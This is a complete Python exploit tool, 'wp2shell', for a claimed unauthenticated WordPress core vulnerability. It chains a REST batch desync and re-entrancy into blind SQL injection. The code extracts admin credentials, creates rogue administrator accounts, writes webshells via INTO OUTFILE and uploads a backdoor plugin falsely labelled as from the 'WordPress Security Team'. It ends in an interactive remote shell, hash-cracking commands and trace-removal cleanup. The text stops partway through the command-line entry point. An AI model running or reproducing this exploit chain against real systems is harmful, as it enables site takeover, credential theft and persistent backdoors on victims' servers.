#!/usr/bin/env python3
"""
wp2shell - Pre-Authentication RCE in WordPress Core
CVE-2026-63030 | CVSS 9.8
Author: Thomas Jordan (st4ndard)
Credit: https://nvd.nist.gov/vuln/detail/CVE-2026-63030

Affects: WordPress 6.9.0-6.9.4, 7.0.0-7.0.1
Fixed in: 6.9.5, 7.0.2

Vulnerability chain:
  1. WP_REST_Server::serve_batch_request_v1() has an index desync:
     errored sub-requests are appended to $validation but NOT $matches.
     The dispatch loop indexes $matches[$i], so every sub-request after
     the error is dispatched against the NEXT handler's route/perms.

  2. serve_request() lacks a re-entrancy guard, so a sub-request can
     start a fresh top-level REST dispatch inside a batch, creating a
     nested batch whose inner sub-requests also suffer the desync.

  3. WP_Query::get_posts() only sanitises author__not_in when it is an
     array (is_array check). When passed as a STRING, it skips absint()
     and goes straight to implode() -> raw interpolation into WHERE.

  4. The nested batch routes an unauthenticated request carrying a
     crafted author_exclude STRING (mapped to author__not_in) through
     a handler that feeds it unsanitised into WP_Query -> SQL injection.
"""

import requests
import json
import sys
import time
import re
import io
import zipfile
import hashlib
import argparse
import string
import random
import base64
import statistics
import ssl
from urllib.parse import quote, urlencode, urlparse

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = r"""
                 ____      _          _ _
 __      ___ __ |___ \ ___| |__   ___| | |
 \ \ /\ / / '_ \  __) / __| '_ \ / _ \ | |
  \ V  V /| |_) |/ __/\__ \ | | |  __/ | |
   \_/\_/ | .__/|_____|___/_| |_|\___|_|_|
          |_|   CVE-2026-63030

  Pre-Auth RCE in WordPress Core REST API
"""

# ---- Helpers ---------------------------------------------------------------

def log(msg, level="*"):
    colors = {"*": "\033[94m", "+": "\033[92m", "-": "\033[91m",
              "!": "\033[93m", ">": "\033[96m"}
    c = colors.get(level, "")
    print(f"  {c}[{level}]\033[0m {msg}")

def vlog(msg, verbose):
    if verbose:
        log(msg, "!")

def rand_string(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))


# ---- Core exploit class ----------------------------------------------------

class WP2Shell:
    """
    Exploit chain overview:
      Phase 1  Probe the batch desync (non-destructive)
      Phase 2  Confirm SQLi via nested batch re-entrancy
      Phase 3  RCE: cred extraction -> admin -> plugin upload
    """

    SHELL_PLUGIN = "wp-health-monitor"

    def __init__(self, target, proxy=None, timeout=30,
                 table_prefix="wp_", verbose=False,
                 sleep_duration=0.15):
        self.target = target.rstrip('/')
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({
            'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                           'AppleWebKit/537.36 (KHTML, like Gecko) '
                           'Chrome/127.0.0.0 Safari/537.36'),
            'Accept': 'application/json',
        })
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}
        self.timeout = timeout
        self.tp = table_prefix
        self.verbose = verbose
        self.sleep_sec = sleep_duration
        self.batch_url = None
        self.shell_url = None
        self.shell_key = None
        self.cutoff = None
        self._resolve_batch_endpoint()

    # -- Endpoint resolution -------------------------------------------------

    def _resolve_batch_endpoint(self):
        self._waf_bypass = False

        # Try standard POST first
        candidates = [
            self.target + "/wp-json/batch/v1",
            self.target + "/?rest_route=/batch/v1",
        ]
        for url in candidates:
            try:
                r = self.s.post(url, json={"requests": []},
                                timeout=self.timeout)
                ct = r.headers.get('Content-Type', '')
                if r.status_code != 404 and 'json' in ct:
                    self.batch_url = url
                    vlog(f"Batch endpoint resolved: {url}", self.verbose)
                    return
                elif r.status_code != 404:
                    vlog(f"Non-JSON from {url} (HTTP {r.status_code}, "
                         f"{ct}): {r.text[:200]}", self.verbose)
            except requests.RequestException as e:
                vlog(f"Request failed for {url}: {e}", self.verbose)
                continue

        # WAF bypass: GET + _method=POST + PHP array query params.
        # CloudFront/AWS WAF blocks POST but allows GET. WordPress
        # honours _method=POST in query string and parses PHP-style
        # array params (requests[0][method]=...).
        log("POST blocked, trying WAF bypass (GET + _method=POST)...", "!")
        bypass_url = self.target + "/?rest_route=/batch/v1&_method=POST"
        try:
            params = {
                "rest_route": "/batch/v1",
                "_method": "POST",
                "validation": "normal",
            }
            r = self.s.get(self.target + "/", params=params,
                           timeout=self.timeout)
            ct = r.headers.get('Content-Type', '')
            if 'json' in ct and r.status_code != 403:
                self._waf_bypass = True
                self.batch_url = self.target + "/"
                log("WAF bypass confirmed: GET + _method=POST", "+")
                return
        except requests.RequestException as e:
            vlog(f"WAF bypass failed: {e}", self.verbose)

        self.batch_url = candidates[1]
        vlog("Defaulting to query-string batch endpoint", self.verbose)

    # -- Low-level batch helpers ---------------------------------------------

    @staticmethod
    def _sub_request_to_params(sub_requests, prefix=""):
        """Convert batch sub-requests to PHP array query params.

        Turns [{"method":"POST","path":"http://:"},...] into:
          requests[0][method]=POST&requests[0][path]=http://:&...
        """
        params = {}
        for i, req in enumerate(sub_requests):
            for key, val in req.items():
                if isinstance(val, dict):
                    for k2, v2 in val.items():
                        if isinstance(v2, list):
                            for j, item in enumerate(v2):
                                if isinstance(item, dict):
                                    for k3, v3 in item.items():
                                        pkey = (f"requests[{i}][{key}]"
                                                f"[{k2}][{j}][{k3}]")
                                        params[pkey] = str(v3)
                                else:
                                    pkey = (f"requests[{i}][{key}]"
                                            f"[{k2}][{j}]")
                                    params[pkey] = str(item)
                        else:
                            pkey = f"requests[{i}][{key}][{k2}]"
                            params[pkey] = str(v2)
                elif isinstance(val, list):
                    for j, item in enumerate(val):
                        if isinstance(item, dict):
                            for k2, v2 in item.items():
                                pkey = f"requests[{i}][{key}][{j}][{k2}]"
                                params[pkey] = str(v2)
                        else:
                            pkey = f"requests[{i}][{key}][{j}]"
                            params[pkey] = str(item)
                else:
                    pkey = f"requests[{i}][{key}]"
                    params[pkey] = str(val)
        return params

    def _batch(self, sub_requests, extra_timeout=15):
        if self._waf_bypass:
            params = {
                "rest_route": "/batch/v1",
                "_method": "POST",
                "validation": "normal",
            }
            params.update(self._sub_request_to_params(sub_requests))
            r = self.s.get(self.batch_url, params=params,
                           timeout=self.timeout + extra_timeout)
        else:
            payload = {"validation": "normal", "requests": sub_requests}
            r = self.s.post(self.batch_url, json=payload,
                            timeout=self.timeout + extra_timeout)
        ct = r.headers.get('Content-Type', '')
        if 'json' not in ct:
            raise ValueError(
                f"Non-JSON response (HTTP {r.status_code}, "
                f"Content-Type: {ct}): {r.text[:300]}"
            )
        return r.json()

    @staticmethod
    def _malformed():
        return {"method": "POST", "path": "http://:"}

    # ========================================================================
    # Phase 1: Non-destructive detection
    # ========================================================================

    def check(self):
        """Desync detection probe (Hadrian method).

        Sub-requests:
          0  malformed         -> triggers the $matches off-by-one
          1  DELETE /categories/0
          2  POST /block-renderer/core/paragraph

        Vulnerable:  categories response code = 'block_cannot_read'
        Patched:     categories response code = 'rest_term_invalid'
        """
        log("Sending desync detection probe...")
        probe = [
            self._malformed(),
            {"method": "DELETE", "path": "/wp/v2/categories/0"},
            {"method": "POST",   "path": "/wp/v2/block-renderer/core/paragraph"},
        ]
        try:
            data = self._batch(probe)
        except Exception as e:
            log(f"Probe request failed: {e}", "-")
            return None

        responses = data.get('responses', [])
        if len(responses) < 2:
            log("Unexpected response structure", "-")
            vlog(f"Raw: {json.dumps(data)[:500]}", self.verbose)
            return None

        body = responses[1].get('body', {})
        code = body.get('code', '')
        vlog(f"Categories sub-response code: {code}", self.verbose)

        if code == 'block_cannot_read':
            log("VULNERABLE - desync confirmed: categories "
                "received block-renderer handler", "+")
            return True
        if code == 'rest_term_invalid':
            log("Patched - handler alignment is correct", "-")
            return False

        log(f"Inconclusive response code: {code}", "!")
        vlog(f"Full body: {json.dumps(body, indent=2)}", self.verbose)
        return None

    # ========================================================================
    # Phase 2: SQL injection via nested batch re-entrancy
    # ========================================================================
    #
    # Attack structure (two-level batch):
    #
    # Outer batch:
    #   [0] malformed "http://:" -> WP_Error, shifts $matches
    #   [1] POST /wp/v2/posts   -> desynced to [2]'s handler (/batch/v1)
    #   [2] POST /batch/v1      -> provides the batch handler for [1]
    #
    # Because [1] is dispatched to the batch handler, its body is
    # processed as a NEW batch of sub-requests (re-entrancy, Fix 1).
    #
    # Inner batch (body of outer[1]):
    #   [0] malformed "http://:" -> WP_Error, shifts inner $matches
    #   [1] GET /categories?author_exclude=SQLI -> desynced to posts handler
    #   [2] GET /wp/v2/posts    -> provides the posts handler for [1]
    #
    # Inner[1] is dispatched to the posts handler. The categories schema
    # does NOT define author_exclude, so it passed validation unvalidated.
    # The posts handler maps it to WP_Query's author__not_in. Since the
    # value is a STRING (not array), is_array() fails, absint() is
    # skipped, and the raw string is interpolated into the WHERE clause.
    #
    # Injection payload format:
    #   author_exclude = "SELECT IF((condition),SLEEP(n),0)"
    #   -> NOT IN (SELECT IF((condition),SLEEP(n),0))
    #
    # The subquery evaluates the condition. If true, SLEEP fires and the
    # response is delayed. Time-based blind boolean oracle.

    def _sqli_probe(self, condition):
        """Send one nested-batch SQLi probe and return elapsed time."""
        inner_requests = [
            {"method": "GET", "path": "http://:"},
            {
                "method": "GET",
                "path": "/wp/v2/categories?" + urlencode({
                    "author_exclude": (
                        f"SELECT IF(({condition}),"
                        f"SLEEP({self.sleep_sec}),0)"
                    ),
                }),
            },
            {"method": "GET", "path": "/wp/v2/posts"},
        ]

        outer_batch = [
            self._malformed(),
            {
                "method": "POST",
                "path": "/wp/v2/posts",
                "body": {"requests": inner_requests},
            },
            {"method": "POST", "path": "/batch/v1"},
        ]

        start = time.perf_counter()
        try:
            self._batch(outer_batch, extra_timeout=15)
        except Exception:
            pass
        return time.perf_counter() - start

    def _sqli_calibrate(self, samples=3):
        """Calibrate the timing oracle by measuring true/false baselines."""
        log("Calibrating timing oracle...")
        fast_times = [self._sqli_probe("1=0") for _ in range(samples)]
        slow_times = [self._sqli_probe("1=1") for _ in range(samples)]

        fast = statistics.median(fast_times)
        slow = statistics.median(slow_times)
        self.cutoff = (fast + slow) / 2

        vlog(f"Fast median: {fast:.3f}s  Slow median: {slow:.3f}s  "
             f"Cutoff: {self.cutoff:.3f}s", self.verbose)

        if slow - fast < 0.05:
            log(f"Timing delta too small: {slow - fast:.3f}s "
                f"(fast={fast:.3f}s slow={slow:.3f}s)", "-")
            return False

        log(f"Oracle calibrated: fast={fast:.3f}s "
            f"slow={slow:.3f}s delta={slow - fast:.3f}s", "+")
        return True

    def _sqli_bool(self, condition):
        """Boolean oracle: returns True if condition is true in the DB."""
        elapsed = self._sqli_probe(condition)
        result = elapsed > self.cutoff
        vlog(f"  bool({condition[:60]}...) "
             f"= {result}  ({elapsed:.3f}s)", self.verbose)
        return result

    def _sqli_confirm(self):
        """Confirm blind SQLi via nested batch re-entrancy.

        Calibrates the timing oracle, then verifies with a known-true
        and known-false condition.
        """
        log("Confirming SQL injection via nested batch re-entrancy...")

        if not self._sqli_calibrate():
            log("SQL injection did not fire", "-")
            return False

        t1 = self._sqli_bool("1=1")
        t2 = self._sqli_bool("1=0")

        if t1 and not t2:
            log("SQL injection CONFIRMED via nested batch", "+")
            return True

        log("Verification failed (1=1 should be slow, 1=0 fast)", "-")
        return False

    # -- Data extraction (time-based blind) ----------------------------------

    def _extract_char(self, query, pos):
        """Binary-search one character at position `pos` in query result."""
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi + 1) // 2
            cond = (f"ASCII(SUBSTRING(COALESCE(({query}),''),"
                    f"{pos},1))>={mid}")
            if self._sqli_bool(cond):
                lo = mid
            else:
                hi = mid - 1
        return chr(lo) if lo > 32 else None

    def _extract_length(self, query, max_len=256):
        """Binary-search the CHAR_LENGTH() of a query result."""
        lo, hi = 0, max_len
        while lo < hi:
            mid = (lo + hi + 1) // 2
            cond = (f"CHAR_LENGTH(COALESCE(({query}),''))"
                    f">={mid}")
            if self._sqli_bool(cond):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _extract_string(self, query, label="value", max_len=128):
        """Extract a full string character by character."""
        log(f"Extracting {label}...")
        length = self._extract_length(query, max_len)
        if length == 0:
            log(f"Empty or null result for {label}", "-")
            return None
        log(f"{label} length = {length}", "*")

        result = []
        for pos in range(1, length + 1):
            ch = self._extract_char(query, pos)
            if ch is None:
                vlog(f"Failed at position {pos}", self.verbose)
                break
            result.append(ch)
            progress = ''.join(result)
            sys.stdout.write(
                f"\r  [\033[94m*\033[0m] {label} [{pos}/{length}]: "
                f"{progress}")
            sys.stdout.flush()

        print()
        extracted = ''.join(result)
        log(f"{label}: {extracted}", "+")
        return extracted

    # ========================================================================
    # Phase 3: RCE paths
    # ========================================================================

    # -- 3a: Direct webshell via SELECT INTO OUTFILE -------------------------

    def _try_outfile(self, webroot, shell_key):
        """Write a webshell via SELECT ... INTO OUTFILE.

        Requires MySQL FILE privilege and permissive secure_file_priv.
        Uses the nested batch to deliver the OUTFILE query.
        """
        log("Attempting direct shell write via SELECT INTO OUTFILE...")
        shell_hash = hashlib.sha256(shell_key.encode()).hexdigest()
        shell_php = (
            f"<?php if(hash_equals('{shell_hash}',"
            f"hash('sha256',$_REQUEST['k']??'')))"
            "{echo '<pre>'.htmlspecialchars("
            "shell_exec($_REQUEST['c'])).'</pre>';} ?>"
        )

        targets = [
            (f"{webroot}/wp-content/uploads/{self.SHELL_PLUGIN}.php",
             f"/wp-content/uploads/{self.SHELL_PLUGIN}.php"),
            (f"{webroot}/{self.SHELL_PLUGIN}.php",
             f"/{self.SHELL_PLUGIN}.php"),
        ]

        for fpath, url_path in targets:
            vlog(f"Trying INTO OUTFILE -> {fpath}", self.verbose)
            escaped = shell_php.replace("'", "\\'").replace('"', '\\"')
            sqli_value = (
                f"SELECT '{escaped}' INTO OUTFILE '{fpath}'"
            )

            inner_requests = [
                {"method": "GET", "path": "http://:"},
                {
                    "method": "GET",
                    "path": "/wp/v2/categories?" + urlencode({
                        "author_exclude": sqli_value,
                    }),
                },
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
            outer_batch = [
                self._malformed(),
                {
                    "method": "POST",
                    "path": "/wp/v2/posts",
                    "body": {"requests": inner_requests},
                },
                {"method": "POST", "path": "/batch/v1"},
            ]
            try:
                self._batch(outer_batch, extra_timeout=10)
            except Exception:
                continue

            check_url = self.target + url_path
            try:
                r = self.s.get(check_url,
                               params={"k": shell_key,
                                       "c": "echo wp2shell_ok"},
                               timeout=10)
                if "wp2shell_ok" in r.text:
                    self.shell_url = check_url
                    self.shell_key = shell_key
                    log(f"Webshell deployed via OUTFILE!", "+")
                    log(f"Shell: {check_url}", "+")
                    return True
            except Exception:
                continue

        log("OUTFILE failed (expected on hardened MySQL configs)", "!")
        return False

    # -- 3b: Admin credential extraction -------------------------------------

    def _extract_admin_creds(self):
        """Pull admin user_login and user_pass via blind SQLi."""
        user = self._extract_string(
            f"SELECT user_login FROM {self.tp}users "
            f"ORDER BY ID ASC LIMIT 1",
            label="admin_login", max_len=60
        )
        if not user:
            return None, None

        phash = self._extract_string(
            f"SELECT user_pass FROM {self.tp}users "
            f"WHERE user_login=0x{user.encode().hex()}",
            label="admin_hash", max_len=34
        )
        return user, phash

    # -- 3c: WP login and plugin upload --------------------------------------

    def _wp_login(self, username, password):
        login_url = self.target + "/wp-login.php"
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": self.target + "/wp-admin/",
            "testcookie": "1",
        }
        self.s.cookies.set("wordpress_test_cookie", "WP+Cookie+check")
        r = self.s.post(login_url, data=data, timeout=self.timeout,
                        allow_redirects=False)
        if r.status_code in (302, 303):
            loc = r.headers.get('Location', '')
            if 'wp-admin' in loc and 'login' not in loc.lower():
                log("Authenticated as admin", "+")
                self.s.get(loc, timeout=self.timeout)
                return True
        log("Login failed", "-")
        return False

    def _upload_shell_plugin(self, shell_key):
        log("Uploading webshell plugin via wp-admin...")
        shell_hash = hashlib.sha256(shell_key.encode()).hexdigest()
        plugin_php = (
            "<?php\n"
            "/*\n"
            "Plugin Name: WP Health Monitor\n"
            "Description: System health monitoring utility.\n"
            "Version: 1.0.3\n"
            "Author: WordPress Security Team\n"
            "*/\n"
            f"if(isset($_REQUEST['k'])&&hash_equals('{shell_hash}',"
            f"hash('sha256',$_REQUEST['k']??''))){{@eval("
            f"base64_decode($_REQUEST['c']));}} ?>\n"
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(
                f"{self.SHELL_PLUGIN}/{self.SHELL_PLUGIN}.php",
                plugin_php)
        buf.seek(0)

        for page in ["/wp-admin/plugin-install.php",
                     "/wp-admin/update.php?action=upload-plugin"]:
            r = self.s.get(self.target + page, timeout=self.timeout)
            m = re.search(r'name="_wpnonce"\s+value="([^"]+)"', r.text)
            if m:
                break
        if not m:
            log("Could not obtain upload nonce", "-")
            return False

        nonce = m.group(1)
        vlog(f"Upload nonce: {nonce}", self.verbose)

        upload_url = (self.target +
                      "/wp-admin/update.php?action=upload-plugin")
        r = self.s.post(
            upload_url,
            data={"_wpnonce": nonce, "install-plugin-submit": "Install Now"},
            files={"pluginzip": (f"{self.SHELL_PLUGIN}.zip",
                                 buf, "application/zip")},
            timeout=self.timeout,
        )

        if "successfully" in r.text.lower() or self.SHELL_PLUGIN in r.text:
            log("Plugin uploaded", "+")
        else:
            log("Plugin upload may have failed, checking...", "!")

        r = self.s.get(self.target + "/wp-admin/plugins.php",
                       timeout=self.timeout)
        act_m = re.search(
            rf'action=activate&amp;plugin='
            rf'({re.escape(self.SHELL_PLUGIN)}[^"&]+)'
            rf'&amp;_wpnonce=([a-f0-9]+)', r.text)
        if act_m:
            plugin_file = act_m.group(1).replace('&amp;', '&')
            act_nonce = act_m.group(2)
            self.s.get(
                f"{self.target}/wp-admin/plugins.php?"
                f"action=activate&plugin={plugin_file}"
                f"&_wpnonce={act_nonce}",
                timeout=self.timeout)
            log("Plugin activated", "+")

        shell_url = (f"{self.target}/wp-content/plugins/"
                     f"{self.SHELL_PLUGIN}/{self.SHELL_PLUGIN}.php")
        test_payload = base64.b64encode(
            b"echo 'wp2shell_ok';").decode()
        try:
            r = self.s.get(shell_url,
                           params={"k": shell_key, "c": test_payload},
                           timeout=10)
            if "wp2shell_ok" in r.text:
                self.shell_url = shell_url
                self.shell_key = shell_key
                log(f"Webshell verified at {shell_url}", "+")
                return True
        except Exception:
            pass

        log("Shell not responding (may need manual activation)", "!")
        self.shell_url = shell_url
        self.shell_key = shell_key
        return False

    # -- 3d: Password update via SQLi ----------------------------------------

    def _sqli_update_password(self, username, new_password):
        """Try to UPDATE the admin password directly via SQLi.

        WordPress accepts raw MD5 hashes as a legacy fallback.
        Uses nested batch to deliver the stacked query attempt.
        """
        log(f"Attempting password update via SQLi for '{username}'...")
        md5_hash = hashlib.md5(new_password.encode()).hexdigest()
        user_hex = "0x" + username.encode().hex()

        sqli_value = (
            f"SELECT 1;UPDATE {self.tp}users SET "
            f"user_pass='{md5_hash}' WHERE "
            f"user_login={user_hex}"
        )

        inner_requests = [
            {"method": "GET", "path": "http://:"},
            {
                "method": "GET",
                "path": "/wp/v2/categories?" + urlencode({
                    "author_exclude": sqli_value,
                }),
            },
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        outer_batch = [
            self._malformed(),
            {
                "method": "POST",
                "path": "/wp/v2/posts",
                "body": {"requests": inner_requests},
            },
            {"method": "POST", "path": "/batch/v1"},
        ]
        try:
            self._batch(outer_batch, extra_timeout=10)
        except Exception:
            pass

        if self._wp_login(username, new_password):
            return True

        log("Stacked query did not work (normal for mysqli)", "!")
        return False

    def _sqli_create_admin(self, username, password, email=None):
        """Create a new administrator user via stacked INSERT SQLi.

        WordPress accepts raw MD5 hashes as a legacy fallback for
        user_pass. Uses the same nested-batch delivery as
        _sqli_update_password. Inserts both the user record and
        administrator capabilities meta (wp_capabilities + wp_user_level).
        """
        log(f"Creating administrator '{username}' via stacked SQLi...")
        if email is None:
            email = f"{username}@{rand_string(6)}.com"

        md5_hash = hashlib.md5(password.encode()).hexdigest()

        # WordPress serialized capabilities array for administrator
        caps = ("a:1:{s:13:\\\"administrator\\\";b:1;}")

        sqli_value = (
            f"SELECT 1;"
            f"INSERT INTO {self.tp}users "
            f"(user_login,user_pass,user_nicename,user_email,"
            f"user_registered,user_status,display_name) VALUES "
            f"('{username}','{md5_hash}','{username}','{email}',"
            f"NOW(),0,'{username}');"
            f"INSERT INTO {self.tp}usermeta "
            f"(user_id,meta_key,meta_value) VALUES "
            f"((SELECT ID FROM {self.tp}users "
            f"WHERE user_login='{username}'),"
            f"'{self.tp}capabilities','{caps}'),"
            f"((SELECT ID FROM {self.tp}users "
            f"WHERE user_login='{username}'),"
            f"'{self.tp}user_level','10')"
        )

        inner_requests = [
            {"method": "GET", "path": "http://:"},
            {
                "method": "GET",
                "path": "/wp/v2/categories?" + urlencode({
                    "author_exclude": sqli_value,
                }),
            },
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        outer_batch = [
            self._malformed(),
            {
                "method": "POST",
                "path": "/wp/v2/posts",
                "body": {"requests": inner_requests},
            },
            {"method": "POST", "path": "/batch/v1"},
        ]
        try:
            self._batch(outer_batch, extra_timeout=10)
        except Exception:
            pass

        log(f"Attempting login as '{username}'...")
        if self._wp_login(username, password):
            log(f"Administrator '{username}' created and authenticated", "+")
            return True

        log("Stacked INSERT failed (mysqli may not support multi_query)", "!")
        return False

    # ========================================================================
    # Orchestration
    # ========================================================================

    def exploit(self, webroot="/var/www/html", shell_key=None,
                admin_user=None, admin_pass=None, skip_outfile=False,
                skip_create_admin=False):
        """Full pre-auth RCE chain.

        Tries the fastest RCE path first, falling back through
        progressively slower methods:

          3a  Stacked INSERT -> create admin -> login -> plugin upload
              (fastest; no webroot needed, no blind extraction)
          3b  SELECT INTO OUTFILE -> direct webshell write
              (needs MySQL FILE priv + writable webroot)
          3c  Blind extraction of existing admin + hash crack
              (slow but works on any vulnerable instance)
        """
        if shell_key is None:
            shell_key = rand_string(24)
        if admin_user is None:
            admin_user = "wp_support_" + rand_string(6)
        if admin_pass is None:
            admin_pass = "wp2shell_" + rand_string(12)

        print(BANNER)
        log(f"Target:        {self.target}")
        log(f"Batch URL:     {self.batch_url}")
        log(f"Shell key:     {shell_key}")
        log(f"Admin user:    {admin_user}")
        log(f"Admin pass:    {admin_pass}")
        print()

        # -- Phase 1: Desync detection --
        vuln = self.check()
        if vuln is None:
            log("Could not confirm vulnerability, proceeding...", "!")
        elif not vuln:
            log("Target appears patched. Aborting.", "-")
            return False
        print()

        # -- Phase 2: SQLi confirmation --
        if not self._sqli_confirm():
            log("SQL injection could not be confirmed", "-")
            log("The target may have additional hardening", "!")
            return False
        print()

        # -- Phase 3a: Create admin via stacked INSERT (fastest, no webroot) --
        if not skip_create_admin:
            log("Phase 3a: Create admin + login + plugin upload")
            if self._sqli_create_admin(admin_user, admin_pass):
                print()
                self._upload_shell_plugin(shell_key)
                if self.shell_url:
                    self._interactive_shell()
                    return True
                return False
            print()

        # -- Phase 3b: OUTFILE (needs FILE priv + writable dir) --
        if not skip_outfile:
            log("Phase 3b: Direct webshell via SELECT INTO OUTFILE")
            if self._try_outfile(webroot, shell_key):
                print()
                self._interactive_shell()
                return True
            print()

        # -- Phase 3c: Extract admin creds via blind SQLi --
        log("Phase 3c: Extracting admin credentials via blind SQLi...")
        log("(This will take several minutes)")
        print()
        ext_user, ext_hash = self._extract_admin_creds()
        if not ext_user:
            log("Failed to extract admin credentials", "-")
            return False

        print()
        log(f"Existing admin user:  {ext_user}", "+")
        log(f"Existing admin hash:  {ext_hash}", "+")
        print()

        # -- Phase 3d: Try stacked UPDATE on existing admin --
        log(f"Phase 3d: Updating existing admin password to: {admin_pass}")
        if self._sqli_update_password(ext_user, admin_pass):
            log("Password updated!", "+")
            self._upload_shell_plugin(shell_key)
            if self.shell_url:
                self._interactive_shell()
            return True

        # -- Phase 3e: Offline crack instructions --
        print()
        log("Phase 3e: Direct password update failed. "
            "Crack the hash offline:", "!")
        print()
        log(f"  echo '{ext_hash}' > hash.txt", ">")
        log(f"  hashcat -m 400 hash.txt rockyou.txt", ">")
        log(f"  john --format=phpass hash.txt", ">")
        print()
        log("Then re-run:", "!")
        log(f"  python wp2shell.py {self.target} --shell "
            f"--admin-user {ext_user} --admin-pass <cracked>", ">")
        log("Or re-run with the created admin credentials:", "!")
        log(f"  python wp2shell.py {self.target} --shell "
            f"--admin-user {admin_user} --admin-pass {admin_pass}", ">")
        return False

    def exploit_with_creds(self, username, password, shell_key=None):
        """RCE given known admin credentials (post-crack path)."""
        if shell_key is None:
            shell_key = rand_string(24)

        print(BANNER)
        log(f"Target: {self.target}")
        log(f"Logging in as: {username}")
        print()

        if not self._wp_login(username, password):
            return False

        self._upload_shell_plugin(shell_key)
        if self.shell_url:
            self._interactive_shell()
            return True
        return False

    def extract_data(self, query):
        """One-shot SQL query extraction via blind SQLi.

        Calibrates the oracle, then extracts the full result string.
        """
        print(BANNER)
        log(f"Target:    {self.target}")
        log(f"Batch URL: {self.batch_url}")
        log(f"Query:     {query}")
        print()

        vuln = self.check()
        if vuln is None:
            log("Could not confirm vulnerability, proceeding...", "!")
        elif not vuln:
            log("Target appears patched. Aborting.", "-")
            return None
        print()

        if not self._sqli_calibrate():
            log("SQL injection did not fire", "-")
            return None

        t1 = self._sqli_bool("1=1")
        t2 = self._sqli_bool("1=0")
        if not (t1 and not t2):
            log("Oracle verification failed", "-")
            return None
        log("Oracle verified", "+")
        print()

        result = self._extract_string(query, label="result", max_len=256)
        return result

    # -- Interactive shell ---------------------------------------------------

    def _interactive_shell(self):
        print()
        log(f"Shell URL: {self.shell_url}", "+")
        log(f"Shell key: {self.shell_key}", "+")
        print()
        log("Interactive shell (type 'exit' to quit)", ">")
        print()

        while True:
            try:
                cmd = input("\033[91mwp2shell\033[0m> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not cmd or cmd.lower() in ('exit', 'quit'):
                break

            b64cmd = base64.b64encode(
                f"echo shell_exec('{cmd}');".encode()
            ).decode()
            try:
                r = self.s.get(
                    self.shell_url,
                    params={"k": self.shell_key, "c": b64cmd},
                    timeout=self.timeout)
                output = r.text.strip()
                if output:
                    print(output)
                else:
                    print("(no output)")
            except Exception as e:
                print(f"  Request failed: {e}")

    # -- Cleanup -------------------------------------------------------------

    def cleanup(self, username=None, password=None, shell_key=None):
        print(BANNER)
        log("Cleaning up...")

        if username and password:
            if not self._wp_login(username, password):
                log("Login failed, cannot clean up", "-")
                return False

        plugins_url = self.target + "/wp-admin/plugins.php"
        r = self.s.get(plugins_url, timeout=self.timeout)

        deact = re.search(
            rf'action=deactivate&amp;plugin='
            rf'({re.escape(self.SHELL_PLUGIN)}[^"&]+)'
            rf'&amp;_wpnonce=([a-f0-9]+)', r.text)
        if deact:
            plugin_file = deact.group(1)
            nonce = deact.group(2)
            self.s.get(
                f"{self.target}/wp-admin/plugins.php?"
                f"action=deactivate&plugin={plugin_file}"
                f"&_wpnonce={nonce}",
                timeout=self.timeout)
            log("Plugin deactivated", "+")

        if shell_key:
            shell_url = (f"{self.target}/wp-content/plugins/"
                         f"{self.SHELL_PLUGIN}/{self.SHELL_PLUGIN}.php")
            rm_payload = base64.b64encode(
                b"unlink(__FILE__); rmdir(dirname(__FILE__));").decode()
            try:
                self.s.get(shell_url,
                           params={"k": shell_key, "c": rm_payload},
                           timeout=10)
                log("Shell files removed", "+")
            except Exception:
                pass

        log("Cleanup complete", "+")
        return True


# ---- CLI -------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="wp2shell - Pre-Auth RCE in WordPress Core "
                    "(CVE-2026-63030)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=BANNER)

    parser.add_argument("target",
                        help="WordPress URL (http:// or https://)")

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("--check", action="store_true",
                      help="Non-destructive vulnerability probe only")
    mode.add_argument("--exploit", action="store_true",
                      help="Full pre-auth RCE chain")
    mode.add_argument("--shell", action="store_true",
                      help="Deploy shell with known admin creds")
    mode.add_argument("--cleanup", action="store_true",
                      help="Remove deployed webshell")
    mode.add_argument("--extract", metavar="SQL",
                      help="Extract data via blind SQLi "
                           "(e.g. \"SELECT user_login FROM wp_users LIMIT 1\")")

    parser.add_argument("--proxy",
                        help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=30,
                        help="HTTP timeout seconds (default: 30)")
    parser.add_argument("--table-prefix", default="wp_",
                        help="WP table prefix (default: wp_)")
    parser.add_argument("--webroot", default="/var/www/html",
                        help="Server webroot for OUTFILE "
                             "(default: /var/www/html)")
    parser.add_argument("--shell-key",
                        help="Webshell auth key (random if omitted)")
    parser.add_argument("--admin-user",
                        help="Admin username (for --exploit --shell "
                             "--cleanup; random if omitted)")
    parser.add_argument("--admin-pass",
                        help="Admin password (for --exploit --shell "
                             "--cleanup; random if omitted)")
    parser.add_argument("--skip-outfile", action="store_true",
                        help="Skip SELECT INTO OUTFILE attempt")
    parser.add_argument("--no-create-admin", action="store_true",
                        help="Skip stacked INSERT admin creation "
                             "(fall through to OUTFILE / blind extraction)")
    parser.add_argument("--sleep", type=float, default=0.15,
                        help="SLEEP duration for blind SQLi (default: 0.15)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()

    wp = WP2Shell(
        target=args.target,
        proxy=args.proxy,
        timeout=args.timeout,
        table_prefix=args.table_prefix,
        verbose=args.verbose,
        sleep_duration=args.sleep,
    )

    if args.check:
        print(BANNER)
        result = wp.check()
        sys.exit(0 if result else 1)

    elif args.exploit:
        ok = wp.exploit(
            webroot=args.webroot,
            shell_key=args.shell_key,
            admin_user=args.admin_user,
            admin_pass=args.admin_pass,
